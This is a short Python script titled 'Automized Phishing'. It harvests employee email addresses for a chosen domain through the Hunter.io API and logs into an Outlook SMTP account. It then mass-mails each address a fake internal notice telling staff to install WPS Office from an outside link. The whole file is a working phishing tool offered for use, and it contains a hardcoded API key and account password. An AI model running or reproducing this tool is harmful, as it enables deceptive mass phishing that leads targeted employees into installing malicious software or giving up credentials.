import smtplib
print("███████╗░█████╗░███╗░░██╗██████╗░░█████╗░███╗░░██╗░██████╗░░█████╗░")
print("██╔════╝██╔══██╗████╗░██║██╔══██╗██╔══██╗████╗░██║██╔════╝░██╔══██╗")
print("█████╗░░███████║██╔██╗██║██║░░██║███████║██╔██╗██║██║░░██╗░██║░░██║")
print("██╔══╝░░██╔══██║██║╚████║██║░░██║██╔══██║██║╚████║██║░░╚██╗██║░░██║")
print("██║░░░░░██║░░██║██║░╚███║██████╔╝██║░░██║██║░╚███║╚██████╔╝╚█████╔╝")
print("╚═╝░░░░░╚═╝░░╚═╝╚═╝░░╚══╝╚═════╝░╚═╝░░╚═╝╚═╝░░╚══╝░╚═════╝░░╚════╝░")
print("")
print("Automized Phishing")
print("")
print("[+] Attempting phishing attack...")


from pyhunter import PyHunter
hunter = PyHunter('445311743868f0f65449f96297c78aa175ca16d3')

domain= input("Domain> ")
output= hunter.domain_search(domain)
stripped_output= output["emails"]
emails=[]
for element in stripped_output:
    emails.append(element["value"])


server= smtplib.SMTP("smtp-mail.outlook.com", 587)
server.starttls()
server.login("fandango-software@hotmail.com","WillYouDoTheFandango?")




for email in emails:
    msg = """From: Fandango Software <fandango-software@hotmail.com>
To: <"""+email+""">
MIME-Version: 1.0
Content-type: text/html
Subject: Changes in Text Editor Software

<body>
    Our company is moving on from Microsoft Office and switching to WPS Office to increase efficency and reduce costs. Collaborative projects will go through WPS Office so all employees are expected to install WPS Office. An account will be assigned to you soon. We are hoping that this change will not affect progress. You can install WPS Office <a href="fandangosoftware.com">here</a>.
    
    <br>
    Thank you for your collaboration.
</body>

"""
    server.sendmail("fandango-software@hotmail.com",email, msg)
server.quit()